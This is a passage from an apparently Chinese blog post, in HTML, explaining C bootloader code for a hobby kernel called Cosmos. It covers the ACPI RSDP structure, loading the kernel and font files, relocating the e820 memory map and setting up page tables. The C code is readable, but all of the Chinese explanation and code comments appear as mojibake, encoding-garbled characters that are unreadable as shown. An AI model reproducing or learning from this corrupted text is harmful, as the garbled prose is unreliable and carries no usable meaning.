class="comment">//å‡½æ•°æ£€æŸ¥å¤åˆ¶çš„æ•°æ®æ˜¯å¦æœ‰æ•ˆ</span></span><br><span class="line">    &#123;</span><br><span class="line">        kerror(<span class="string">&quot;Your computer is not support ACPI!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹å…³äºAPICçš„ç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">s_MRSDP</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">u64_t</span> rp_sign;<span class="comment">//ç­¾åå­—æ®µï¼Œç”¨äºæ ‡è¯†è¿™ä¸ªç»“æ„ä½“åŒ…å«çš„æ•°æ®ç±»å‹æˆ–æ ¼å¼</span></span><br><span class="line">    <span class="keyword">u8_t</span> rp_chksum;<span class="comment">//æ ¡éªŒå’Œå­—æ®µï¼Œç”¨äºéªŒè¯ç»“æ„ä½“æ•°æ®çš„å®Œæ•´æ€§</span></span><br><span class="line">    <span class="keyword">u8_t</span> rp_oemid[<span class="number">6</span>];<span class="comment">//OEMï¼ˆåŸå§‹è®¾å¤‡åˆ¶é€ å•†ï¼‰æ ‡è¯†ç¬¦ï¼Œç”¨äºæ ‡è¯†åˆ›å»ºè¿™ä¸ªè¡¨çš„ç¡¬ä»¶åˆ¶é€ å•†</span></span><br><span class="line">    <span class="keyword">u8_t</span> rp_revn;<span class="comment">//ä¿®è®¢å·ï¼ŒæŒ‡ç¤ºè¿™ä¸ªç»“æ„ä½“æˆ–æ•°æ®è¡¨çš„ç‰ˆæœ¬</span></span><br><span class="line">    <span class="keyword">u32_t</span> rp_rsdtphyadr;<span class="comment">//RSDTï¼ˆRoot System Description Tableï¼‰çš„ç‰©ç†åœ°å€ï¼Œè¿™æ˜¯ACPIä¸­çš„ä¸€ä¸ªè¡¨ï¼ŒåŒ…å«äº†å…¶ä»–æ‰€æœ‰ç³»ç»Ÿæè¿°è¡¨çš„åœ°å€</span></span><br><span class="line">    <span class="keyword">u32_t</span> rp_len;<span class="comment">//RSDP çš„é•¿åº¦</span></span><br><span class="line">    <span class="keyword">u64_t</span> rp_xsdtphyadr;<span class="comment">//XSDTï¼ˆExtended System Description Tableï¼‰çš„ç‰©ç†åœ°å€ï¼Œè¿™æ˜¯ä¸€ä¸ªæ‰©å±•çš„ç³»ç»Ÿæè¿°è¡¨ï¼ŒåŒ…å«äº†æ›´å¤šçš„ç³»ç»Ÿæè¿°è¡¨åœ°å€</span></span><br><span class="line">    <span class="keyword">u8_t</span> rp_echksum;<span class="comment">//æ‰©å±•æ ¡éªŒå’Œï¼Œå¯èƒ½ç”¨äºéªŒè¯æ•´ä¸ªç»“æ„ä½“æˆ–æ‰©å±•è¡¨çš„å®Œæ•´æ€§</span></span><br><span class="line">    <span class="keyword">u8_t</span> rp_resv[<span class="number">3</span>];<span class="comment">//ä¿ç•™å­—æ®µï¼Œå¿…é¡»å¡«å……ä¸ºé›¶ï¼Œç”¨äºå¯¹é½æˆ–æœªæ¥æ‰©å±•</span></span><br><span class="line">&#125;__attribute__((packed)) <span class="keyword">mrsdp_t</span>;<span class="comment">//è¿™é‡Œçš„__attribute__((packed))ç”¨äºå‘Šè¯‰ç¼–è¯‘å™¨å–æ¶ˆç»“æ„ä½“åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­å­—æ®µç´§å¯†æ’åˆ—ï¼Œæ²¡æœ‰å†…å­˜å¯¹é½å¡«å……</span></span><br></pre></td></tr></table></figure><p><code>mrsdp_t</code> è¡¨ç¤º ACPI RSDPï¼Œä¸»è¦ä½œç”¨å¦‚ä¸‹ï¼š</p><ol><li><strong>æ ‡è¯† ACPI çš„å­˜åœ¨</strong>ï¼š<ul><li>ç³»ç»Ÿé€šè¿‡ <code>rp_sign</code> å­—æ®µï¼ˆç­¾åï¼‰è¯†åˆ« ACPI çš„å­˜åœ¨ã€‚</li><li>ç­¾åé€šå¸¸æ˜¯ <code>&quot;RSD PTR &quot;</code>, ç”¨äºè¡¨æ˜è¿™æ˜¯ä¸€æ®µæœ‰æ•ˆçš„ ACPI æ•°æ®ã€‚</li></ul></li><li><strong>æä¾›å…¥å£ç‚¹</strong>ï¼š<ul><li>å®ƒåŒ…å«äº†æŒ‡å‘ ACPI å…¶ä»–ç³»ç»Ÿæè¿°è¡¨ï¼ˆå¦‚ RSDT æˆ– XSDTï¼‰çš„åœ°å€ã€‚</li><li>RSDT å’Œ XSDT æ˜¯æ ¸å¿ƒçš„ ACPI è¡¨ï¼Œè®°å½•äº†ç³»ç»Ÿä¸­æ‰€æœ‰ ACPI è¡¨çš„åœ°å€ã€‚</li></ul></li><li><strong>æ”¯æŒç”µæºç®¡ç†å’Œç¡¬ä»¶é…ç½®</strong>ï¼š<ul><li>æ“ä½œç³»ç»Ÿé€šè¿‡è§£æ ACPI è¡¨ï¼ˆé€šè¿‡ RSDP æä¾›çš„å…¥å£åœ°å€ï¼‰æ¥å®ç°é«˜çº§ç”µæºç®¡ç†åŠŸèƒ½ï¼Œä¾‹å¦‚å¾…æœºã€ä¼‘çœ ç­‰ã€‚</li><li>è¿˜ç”¨äºç¡¬ä»¶è®¾å¤‡çš„åŠ¨æ€é…ç½®å’Œèµ„æºç®¡ç†ã€‚</li></ul></li></ol><h2 id="è·å–æ˜ åƒæ–‡ä»¶å¤§å°"><a href="#è·å–æ˜ åƒæ–‡ä»¶å¤§å°" class="headerlink" title="è·å–æ˜ åƒæ–‡ä»¶å¤§å°"></a>è·å–æ˜ åƒæ–‡ä»¶å¤§å°</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">u64_t</span> <span class="title">get_wt_imgfilesz</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">u64_t</span> retsz = LDRFILEADR; <span class="comment">// åˆå§‹åŒ–è¿”å›çš„æ–‡ä»¶å¤§å°ä¸ºåŠ è½½æ–‡ä»¶åœ°å€</span></span><br><span class="line">    <span class="keyword">mlosrddsc_t</span> *mrddadrs = MRDDSC_ADR;<span class="comment">// è·å–å†…å­˜ä¸­å½±å“æ–‡ä»¶å¤´æè¿°ç¬¦çš„åœ°å€</span></span><br><span class="line">    <span class="keyword">if</span> (mrddadrs-&gt;mdc_endgic != MDC_ENDGIC ||</span><br><span class="line">        mrddadrs-&gt;mdc_rv != MDC_RVGIC ||</span><br><span class="line">        mrddadrs-&gt;mdc_fhdnr &lt; <span class="number">2</span> ||</span><br><span class="line">        mrddadrs-&gt;mdc_filnr &lt; <span class="number">2</span>)<span class="comment">//æ£€æŸ¥åŸºæœ¬ä¿¡æ¯ï¼Œå¦‚æœä¸æ­£ç¡®ï¼Œåˆ™è¿”å›0</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mrddadrs-&gt;mdc_filbk_e &lt; <span class="number">0x4000</span>)<span class="comment">//æ£€æŸ¥æ–‡ä»¶å—ç»“æŸåœ°å€æ˜¯å¦æœ‰æ•ˆ</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    retsz += mrddadrs-&gt;mdc_filbk_e;</span><br><span class="line">    retsz -= LDRFILEADR;<span class="comment">// å°†æ–‡ä»¶å—ç»“æŸåœ°å€åŠ åˆ°retszä¸Šï¼Œç„¶åå‡å»LDRFILEADRï¼Œå¾—åˆ°æ–‡ä»¶çš„å®é™…å¤§å°</span></span><br><span class="line">    mbsp-&gt;mb_imgpadr = LDRFILEADR;<span class="comment">// è®¾ç½®machbstart_tç»“æ„ä½“ä¸­çš„mb_imgpadrä¸ºLDRFILEADRï¼Œå³æ˜ åƒæ–‡ä»¶çš„åŠ è½½åœ°å€</span></span><br><span class="line">    mbsp-&gt;mb_imgsz = retsz;<span class="comment">// è®¾ç½®machbstart_tç»“æ„ä½“ä¸­çš„mb_imgszä¸ºè®¡ç®—å‡ºçš„æ–‡ä»¶å¤§å°</span></span><br><span class="line">    <span class="keyword">return</span> retsz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·å–æ˜ åƒæ–‡ä»¶çš„èµ·å§‹åœ°å€å’Œå¤§å°ï¼Œå¦‚æœåŸºç¡€ä¿¡æ¯é”™è¯¯æˆ–è€…æ–‡ä»¶ç»“æŸåœ°å€æ— æ•ˆåˆ™æŠ¥é”™</p><h2 id="åˆå§‹åŒ–å†…æ ¸æ ˆ"><a href="#åˆå§‹åŒ–å†…æ ¸æ ˆ" class="headerlink" title="åˆå§‹åŒ–å†…æ ¸æ ˆ"></a>åˆå§‹åŒ–å†…æ ¸æ ˆ</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_krlinitstack</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> &gt; move_krlimg(mbsp, (<span class="keyword">u64_t</span>)(<span class="number">0x8f000</span>), <span class="number">0x1001</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        kerror(<span class="string">&quot;iks_moveimg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mbsp-&gt;mb_krlinitstack = IKSTACK_PHYADR;<span class="comment">//æ ˆé¡¶åœ°å€</span></span><br><span class="line">    mbsp-&gt;mb_krlitstacksz = IKSTACK_SIZE;<span class="comment">//æ ˆå¤§å°æ˜¯4KB</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆå…ˆç¡®è®¤å†…æ ¸æ ˆç©ºé—´æ˜¯å¦å’Œä¹‹å‰åŠ å…¥å†…å­˜ä¸­çš„å†…å®¹æœ‰å†²çªï¼Œmove_krlimgå‡½æ•°é¦–å…ˆå…ˆæ£€æŸ¥åœ°å€æ˜¯å¦åˆæ³•ï¼Œå†é€šè¿‡adrzone_is_okå‡½æ•°æ¥æ£€æŸ¥ä¸¤ä»½å†…å­˜ç©ºé—´æ˜¯å¦æœ‰é‡å ï¼Œå¦‚æœé‡å ï¼Œæ¥ç€å¯¹ç…§ä¹‹å‰è·å–çš„å†…å­˜ä¿¡æ¯ï¼Œæ£€æŸ¥å†…å­˜æ˜¯å¦å¯ç”¨ï¼Œå¦‚æœè¿™éƒ¨åˆ†ä¹Ÿé€šè¿‡äº†ï¼Œå°±å°†å†…æ ¸æ˜ åƒæ–‡ä»¶å¤åˆ¶åˆ°æ ˆç©ºé—´ä¹‹åï¼Œç›®çš„æ˜¯è…¾å‡ºä¹‹å‰é‚£éƒ¨åˆ†çš„å†…å­˜ï¼Œé˜²æ­¢åé¢é‡å è¦†ç›–ï¼Œä½†æ˜¯ç›®å‰æ¥çœ‹ï¼Œå¦‚æœä½¿ç”¨å†…æ ¸æ ˆçš„è¿‡ç¨‹ä¸­æœ‰æ ˆæº¢å‡ºæ¼æ´çš„è¯ï¼Œæ˜¯å¯ä»¥è½»æ˜“è¦†ç›–æ‰è¿™éƒ¨åˆ†å†…å®¹çš„ï¼Œå¦‚æœæ²¡æœ‰é‡å åˆ™ç›´æ¥è¿”å›ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">move_krlimg</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp, <span class="keyword">u64_t</span> cpyadr, <span class="keyword">u64_t</span> cpysz)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0xffffffff</span> &lt;= (cpyadr + cpysz) || <span class="number">1</span> &gt; cpysz)<span class="comment">// æ£€æŸ¥ä¼ è¿›æ¥çš„åœ°å€æ˜¯å¦åˆæ³•</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> *toadr = (<span class="keyword">void</span> *)((<span class="keyword">u32_t</span>)(P4K_ALIGN(cpyadr + cpysz)));<span class="comment">// è®¡ç®—ç›®æ ‡åœ°å€ï¼ˆå‘ä¸Šå¯¹é½åˆ°4KBçš„å€æ•°ï¼‰</span></span><br><span class="line">    <span class="keyword">sint_t</span> tosz = (<span class="keyword">sint_t</span>)mbsp-&gt;mb_imgsz;<span class="comment">// è·å–æ˜ åƒæ–‡ä»¶ç©ºé—´çš„å¤§å°</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != adrzone_is_ok(mbsp-&gt;mb_imgpadr, mbsp-&gt;mb_imgsz, cpyadr, cpysz))<span class="comment">// æ£€æŸ¥æºåœ°å€å’Œå¤§å°æ˜¯å¦å’Œå·²ç»å­˜åœ¨çš„å†…å®¹é‡å </span></span><br><span class="line">    &#123;   <span class="comment">//å¦‚æœé‡å   </span></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> == chk_memsize((<span class="keyword">e820map_t</span> *)((<span class="keyword">u32_t</span>)(mbsp-&gt;mb_e820padr)), (<span class="keyword">u32_t</span>)mbsp-&gt;mb_e820nr, (<span class="keyword">u64_t</span>)((<span class="keyword">u32_t</span>)toadr), (<span class="keyword">u64_t</span>)tosz))<span class="comment">//æ£€æŸ¥å†…å­˜å¤§å°æ˜¯å¦è¶³å¤Ÿ</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        m2mcopy((<span class="keyword">void</span> *)((<span class="keyword">u32_t</span>)mbsp-&gt;mb_imgpadr), toadr, tosz);<span class="comment">// å¤åˆ¶æ˜ åƒå†…å®¹åˆ°0x90000çš„åœ°å€</span></span><br><span class="line">        mbsp-&gt;mb_imgpadr = (<span class="keyword">u64_t</span>)((<span class="keyword">u32_t</span>)toadr);<span class="comment">// æ›´æ–°æ˜ åƒçš„èµ·å§‹åœ°å€</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;<span class="comment">//å¦‚æœä¸é‡å </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ”¾ç½®å†…æ ¸æ–‡ä»¶"><a href="#æ”¾ç½®å†…æ ¸æ–‡ä»¶" class="headerlink" title="æ”¾ç½®å†…æ ¸æ–‡ä»¶"></a>æ”¾ç½®å†…æ ¸æ–‡ä»¶</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_krlfile</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">u64_t</span> sz = r_file_to_padr(mbsp, IMGKRNL_PHYADR, <span class="string">&quot;Cosmos.bin&quot;</span>);<span class="comment">////åœ¨æ˜ åƒä¸­æŸ¥æ‰¾ç›¸åº”çš„æ–‡ä»¶ï¼Œå¹¶å¤åˆ¶åˆ°å¯¹åº”çš„åœ°å€ï¼Œå¹¶è¿”å›æ–‡ä»¶çš„å¤§å°ï¼Œè¿™é‡Œæ˜¯æŸ¥æ‰¾Cosmos.binæ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == sz)</span><br><span class="line">    &#123;</span><br><span class="line">        kerror(<span class="string">&quot;r_file_to_padr err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mbsp-&gt;mb_krlimgpadr = IMGKRNL_PHYADR;<span class="comment">//å¡«å…¥å†…æ ¸èµ·å§‹åœ°å€</span></span><br><span class="line">    mbsp-&gt;mb_krlsz = sz;<span class="comment">//å¡«å…¥å†…æ ¸å¤§å°</span></span><br><span class="line">    mbsp-&gt;mb_nextwtpadr = P4K_ALIGN(mbsp-&gt;mb_krlimgpadr + mbsp-&gt;mb_krlsz);<span class="comment">//å§‹ç»ˆè¦ä¿æŒæŒ‡å‘ä¸‹ä¸€æ®µç©ºé—²å†…å­˜çš„é¦–åœ°å€</span></span><br><span class="line">    mbsp-&gt;mb_kalldendpadr = mbsp-&gt;mb_krlimgpadr + mbsp-&gt;mb_krlsz;<span class="comment">//è®¡ç®—å†…æ ¸ç»“æŸåœ°å€å¹¶ä¿å­˜</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ¥çœ‹r_file_to_padrå‡½æ•°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">u64_t</span> <span class="title">r_file_to_padr</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp, <span class="keyword">u32_t</span> f2adr, <span class="keyword">char_t</span> *fnm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == f2adr || <span class="literal">NULL</span> == fnm || <span class="literal">NULL</span> == mbsp)<span class="comment">//æ£€æŸ¥å‚æ•°</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">u32_t</span> fpadr = <span class="number">0</span>, sz = <span class="number">0</span>;</span><br><span class="line">    get_file_rpadrandsz(fnm, mbsp, &amp;fpadr, &amp;sz);<span class="comment">//æŸ¥æ‰¾æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == fpadr || <span class="number">0</span> == sz)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == chk_memsize((<span class="keyword">e820map_t</span> *)((<span class="keyword">u32_t</span>)mbsp-&gt;mb_e820padr), (<span class="keyword">u32_t</span>)(mbsp-&gt;mb_e820nr), f2adr, sz))<span class="comment">//æ£€æŸ¥å†…å­˜æ˜¯å¦è¶³å¤Ÿ</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != chkadr_is_ok(mbsp, f2adr, sz))<span class="comment">//æ£€æŸ¥ç»™å®šçš„åœ°å€èŒƒå›´æ˜¯å¦æœ‰æ•ˆ</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    m2mcopy((<span class="keyword">void</span> *)fpadr, (<span class="keyword">void</span> *)f2adr, (<span class="keyword">sint_t</span>)sz);<span class="comment">//å¤åˆ¶æ–‡ä»¶åˆ°0x2000000</span></span><br><span class="line">    <span class="keyword">return</span> sz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä»£ç ä¸»è¦æ˜¯è·å–å†…æ ¸æ–‡ä»¶çš„å¤§å°å’Œåœ°å€ï¼Œå¹¶å¤åˆ¶æ–‡ä»¶åˆ°ç»™å®šåœ°å€ï¼Œå…¶ä¸­get_file_rpadrandszå’Œä¹‹å‰ç±»ä¼¼ï¼Œè·å–æ–‡ä»¶å¤´æè¿°ç¬¦æ¥æŸ¥æ‰¾æ–‡ä»¶</p><p>æ¥ä¸‹æ¥å°±æ˜¯å°†è·å–å¾—åˆ°çš„åœ°å€å‚¨å­˜åˆ°ç»“æ„ä½“ä¸­</p><h2 id="æ”¾ç½®å­—åº“æ–‡ä»¶"><a href="#æ”¾ç½®å­—åº“æ–‡ä»¶" class="headerlink" title="æ”¾ç½®å­—åº“æ–‡ä»¶"></a>æ”¾ç½®å­—åº“æ–‡ä»¶</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_defutfont</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">u64_t</span> sz = r_file_to_padr(mbsp, mbsp-&gt;mb_nextwtpadr, <span class="string">&quot;font.fnt&quot;</span>);<span class="comment">//åœ¨æ˜ åƒä¸­æŸ¥æ‰¾ç›¸åº”çš„æ–‡ä»¶ï¼Œå¹¶å¤åˆ¶åˆ°å¯¹åº”çš„åœ°å€ï¼Œå¹¶è¿”å›æ–‡ä»¶çš„å¤§å°ï¼Œè¿™é‡Œæ˜¯æŸ¥æ‰¾Cosmos.binæ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == sz)</span><br><span class="line">    &#123;</span><br><span class="line">        kerror(<span class="string">&quot;r_file_to_padr err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mbsp-&gt;mb_bfontpadr = mbsp-&gt;mb_nextwtpadr;<span class="comment">//å¡«å…¥å­—åº“æ–‡ä»¶èµ·å§‹åœ°å€</span></span><br><span class="line">    mbsp-&gt;mb_bfontsz = sz;<span class="comment">//å¡«å…¥å­—åº“æ–‡ä»¶å¤§å°</span></span><br><span class="line">    mbsp-&gt;mb_nextwtpadr = P4K_ALIGN(mbsp-&gt;mb_nextwtpadr + sz);<span class="comment">//å§‹ç»ˆè¦ä¿æŒæŒ‡å‘ä¸‹ä¸€æ®µç©ºé—²å†…å­˜çš„é¦–åœ°å€</span></span><br><span class="line">    mbsp-&gt;mb_kalldendpadr = mbsp-&gt;mb_bfontpadr + mbsp-&gt;mb_bfontsz;<span class="comment">//è®¡ç®—å†…æ ¸ç»“æŸåœ°å€å¹¶ä¿å­˜</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å’Œæ”¾ç½®å†…æ ¸æ–‡ä»¶ç±»ä¼¼</p><h2 id="å¤åˆ¶e820è¡¨"><a href="#å¤åˆ¶e820è¡¨" class="headerlink" title="å¤åˆ¶e820è¡¨"></a>å¤åˆ¶e820è¡¨</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_meme820</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">e820map_t</span> *semp = (<span class="keyword">e820map_t</span> *)((<span class="keyword">u32_t</span>)(mbsp-&gt;mb_e820padr));<span class="comment">//è·å–e820è¡¨åœ°å€</span></span><br><span class="line">    <span class="keyword">u64_t</span> senr = mbsp-&gt;mb_e820nr;<span class="comment">//è·å–e820çš„æ•°ç»„æ•°é‡</span></span><br><span class="line">    <span class="keyword">e820map_t</span> *demp = (<span class="keyword">e820map_t</span> *)((<span class="keyword">u32_t</span>)(mbsp-&gt;mb_nextwtpadr));<span class="comment">//è·å–ä¸‹ä¸€ä¸ªç©ºé—²åœ°å€å—åœ°å€</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> &gt; move_krlimg(mbsp, (<span class="keyword">u64_t</span>)((<span class="keyword">u32_t</span>)demp), (senr * (<span class="keyword">sizeof</span>(<span class="keyword">e820map_t</span>)))))<span class="comment">//æ£€æŸ¥åœ°å€æ˜¯å¦åˆæ³•ï¼Œæ˜¯å¦å’Œæ˜ åƒæ–‡ä»¶æœ‰é‡å </span></span><br><span class="line">    &#123;</span><br><span class="line">        kerror(<span class="string">&quot;move_krlimg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    m2mcopy(semp, demp, (<span class="keyword">sint_t</span>)(senr * (<span class="keyword">sizeof</span>(<span class="keyword">e820map_t</span>))));<span class="comment">//å°†e820è¡¨å¤åˆ¶åˆ°å­—åº“æ–‡ä»¶ä¹‹å</span></span><br><span class="line">    mbsp-&gt;mb_e820padr = (<span class="keyword">u64_t</span>)((<span class="keyword">u32_t</span>)(demp));<span class="comment">//è®¾ç½®machbstart_tä¸­e820è¡¨çš„åœ°å€</span></span><br><span class="line">    mbsp-&gt;mb_e820sz = senr * (<span class="keyword">sizeof</span>(<span class="keyword">e820map_t</span>));<span class="comment">//è®¾ç½®machbstart_tä¸­e820çš„æ•°é‡</span></span><br><span class="line">    mbsp-&gt;mb_nextwtpadr = P4K_ALIGN((<span class="keyword">u32_t</span>)(demp) + (<span class="keyword">u32_t</span>)(senr * (<span class="keyword">sizeof</span>(<span class="keyword">e820map_t</span>))));<span class="comment">//mb_nextwtpadræ€»æ˜¯æŒ‡å‘ä¸‹ä¸€å—å†…å­˜</span></span><br><span class="line">    mbsp-&gt;mb_kalldendpadr = mbsp-&gt;mb_e820padr + mbsp-&gt;mb_e820sz;<span class="comment">//è®¾ç½®å†…æ ¸ç»“æŸåœ°å€</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†e820è¡¨å¤åˆ¶åˆ°å†…æ ¸ä¹‹å†…ä¸­å’Œä¸Šé¢çš„æ“ä½œä¹Ÿå·®ä¸å¤šï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆè¦ç§»åŠ¨åˆ°å­—åº“æ–‡ä»¶ä¹‹åå“ªï¼Ÿå› ä¸ºå®æ¨¡å¼ä¸‹å¯ä»¥ä½¿ç”¨çš„å†…å­˜ç©ºé—´ä¸å¤šï¼Œå¦‚æœä¸€ç›´å ç”¨è¿™äº›ä½åœ°å€ä¼šå½±å“åé¢è½¬æ¢åˆ°å®æ¨¡å¼ï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶ç§»åŠ¨åˆ°ä¸€ä¸ªå®‰ç¨³çš„ä½ç½®ä¸Šã€‚</p><h2 id="å»ºç«‹-MMU-é¡µè¡¨æ•°æ®"><a href="#å»ºç«‹-MMU-é¡µè¡¨æ•°æ®" class="headerlink" title="å»ºç«‹ MMU é¡µè¡¨æ•°æ®"></a>å»ºç«‹ MMU é¡µè¡¨æ•°æ®</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_bstartpages</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">u64_t</span> *p = (<span class="keyword">u64_t</span> *)(KINITPAGE_PHYADR);<span class="comment">//p æŒ‡å‘é¡¶çº§é¡µè¡¨ï¼ˆPML4ï¼‰</span></span><br><span class="line">    <span class="keyword">u64_t</span> *pdpte = (<span class="keyword">u64_t</span> *)(KINITPAGE_PHYADR + <span class="number">0x1000</span>);<span class="comment">//pdpteæŒ‡å‘é¡µç›®å½•è¡¨ï¼ˆPDPTï¼‰</span></span><br><span class="line">    <span class="keyword">u64_t</span> *pde = (<span class="keyword">u64_t</span> *)(KINITPAGE_PHYADR + <span class="number">0x2000</span>);<span class="comment">//pde æŒ‡å‘é¡µç›®å½•ï¼ˆPDï¼‰</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">u64_t</span> adr = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> &gt; move_krlimg(mbsp, (<span class="keyword">u64_t</span>)(KINITPAGE_PHYADR), (<span class="number">0x1000</span> * <span class="number">16</span> + <span class="number">0x2000</span>)))<span class="comment">//æ£€æŸ¥æ˜¯å¦é‡å </span></span><br><span class="line">    &#123;</span><br><span class="line">        kerror(<span class="string">&quot;move_krlimg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint_t</span> mi = <span class="number">0</span>; mi &lt; PGENTY_SIZE; mi++)<span class="comment">//åˆå§‹åŒ–PML4ï¼ˆé¡¶çº§é¡µç›®å½•è¡¨ï¼‰ï¼ŒPDPTï¼ˆé¡µç›®å½•è¡¨ï¼‰å†…å­˜</span></span><br><span class="line">    &#123;</span><br><span class="line">        p[mi] = <span class="number">0</span>;</span><br><span class="line">        pdpte[mi] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint_t</span> pdei = <span class="number">0</span>; pdei &lt; <span class="number">16</span>; pdei++)<span class="comment">// éå† 16 ä¸ª PDPT æ¡ç›®</span></span><br><span class="line">    &#123;</span><br><span class="line">        pdpte[pdei] = (<span class="keyword">u64_t</span>)((<span class="keyword">u32_t</span>)pde | KPDPTE_RW | KPDPTE_P);<span class="comment">// è®¾ç½® PDPT æ¡ç›®çš„å±æ€§,è®¾ç½®å…¶å­˜åœ¨ä½å’Œè¯»å†™æƒé™</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">uint_t</span> pdeii = <span class="number">0</span>; pdeii &lt; PGENTY_SIZE; pdeii++)<span class="comment">// åœ¨æ¯ä¸ª PDPT æ¡ç›®ä¸­ï¼Œåˆå§‹åŒ–PDæ•°ç»„</span></span><br><span class="line">        &#123;</span><br><span class="line">            pde[pdeii] = adr | KPDE_PS | KPDE_RW | KPDE_P;<span class="comment">// è®¾ç½® PD 